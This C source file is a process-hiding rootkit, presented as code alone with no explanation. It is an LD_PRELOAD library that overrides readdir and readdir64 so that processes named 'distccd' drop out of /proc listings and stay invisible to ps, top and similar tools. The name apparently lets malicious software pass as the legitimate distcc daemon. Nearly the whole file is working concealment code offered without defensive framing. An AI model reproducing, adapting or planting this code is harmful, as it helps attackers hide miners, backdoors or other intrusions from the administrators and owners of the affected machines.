#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>

static const char * const proc = "distccd";

static const int get_dir_proc(DIR * const dirp, char * const buf)
{
	const int fd = dirfd(dirp);
	if (fd == -1) return 0;
	char path[32] = "/proc/self/fd/";
	snprintf(path + 14, 8, "%d", fd);
	const ssize_t ret = readlink(path, buf, 256);
	if (!ret)
		return ret;
	buf[ret] = 0;
	return !strcmp(buf, "/proc");
}
static const int get_proc_match(char * const pid, char * const buf)
{
	snprintf(buf + 5, 256, "/%s/comm", pid);
	const int fd = open(buf, O_RDONLY);
	if (fd == -1) return 0;
	const int ret = read(fd, buf, 256);
	close(fd);
	if (!ret)
		return ret;
	buf[ret - 1] = 0;
	return !strcmp(buf, proc);
}

#define DECLARE_READDIR(dirent, readdir)                               \
static struct dirent* (*original_##readdir)(DIR * const) = NULL;       \
struct dirent* readdir(DIR * const dirp)                               \
{                                                                      \
	if (!original_##readdir)                                           \
		original_##readdir = dlsym(RTLD_NEXT, #readdir);               \
	do {                                                               \
		struct dirent * const dir = original_##readdir(dirp);          \
		char buffer[256];                                              \
		if (!dir                                  ||                   \
		    !get_dir_proc(dirp, buffer)           ||                   \
		    !get_proc_match(dir->d_name, buffer))                      \
			return dir;                                                \
	} while (1);                                                       \
}

DECLARE_READDIR(dirent64, readdir64);
DECLARE_READDIR(dirent, readdir);
